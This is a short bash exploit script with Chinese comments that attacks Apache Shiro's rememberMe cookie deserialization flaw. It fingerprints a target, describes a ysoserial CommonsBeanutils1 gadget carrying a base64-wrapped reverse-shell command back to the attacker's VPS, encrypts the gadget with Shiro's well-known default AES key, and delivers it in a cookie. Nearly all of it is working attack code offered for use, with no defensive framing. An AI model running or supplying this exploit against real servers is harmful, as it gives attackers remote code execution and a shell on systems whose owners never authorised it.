#!/usr/bin/env bash
# 1) 指纹
TARGET="${1:?usage: bash shiro.sh http://TARGET:PORT}"
curl -sS -D - -o /dev/null -m 10 "$TARGET/" -H 'Cookie: rememberMe=1' | grep -i 'rememberMe'   && echo "Shiro 存在（deleteMe）" || echo "未发现 deleteMe（可能不是 Shiro 或已修复）"

# 2) 生成 gadget（反弹到自己的 VPS，命令用 base64 包裹避开空格问题）
#    java -jar ysoserial.jar CommonsBeanutils1 \
#      'bash -c {echo,<反弹shell命令的base64>}|{base64,-d}|bash' > gadget.ser

# 3) AES-CBC 加密（默认 key）
python3 - <<'PY'
import base64, uuid
from Crypto.Cipher import AES
KEY = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
raw = open('gadget.ser', 'rb').read()
raw += b'\x00' * (16 - len(raw) % 16)
iv = uuid.uuid4().bytes
print('rememberMe=' + base64.b64encode(iv + AES.new(KEY, AES.MODE_CBC, iv).encrypt(raw)).decode())
PY

# 4) 打（把上一步输出贴进 Cookie）
#    curl -sS "$TARGET/" -H 'Cookie: rememberMe=<base64>'
